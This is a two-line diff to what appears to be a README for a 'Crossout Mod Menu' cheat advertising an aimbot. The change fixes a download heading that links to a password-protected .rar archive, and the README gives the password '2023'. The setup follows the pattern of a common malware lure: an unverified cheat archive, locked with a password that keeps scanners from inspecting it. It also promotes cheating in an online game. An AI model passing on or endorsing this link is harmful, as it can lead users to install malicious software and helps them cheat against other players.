@@ -15,7 +15,7 @@ Reading Features:
 - Accurate and effective aimbot with anticipation.
 
 
-# 🗂[Ｄ Ｏ Ｗ Ｎ Ｌ Ｏ Ａ](https://github.com/YnIOnDemosQ/Crossout-Mod-Menu/raw/main/Crossout%20Cheat.rar)
+# 🗂[Ｄ Ｏ Ｗ Ｎ Ｌ Ｏ Ａ Ｄ](https://github.com/YnIOnDemosQ/Crossout-Mod-Menu/raw/main/Crossout%20Cheat.rar)
 
 
 # 🔐Pass: 2023
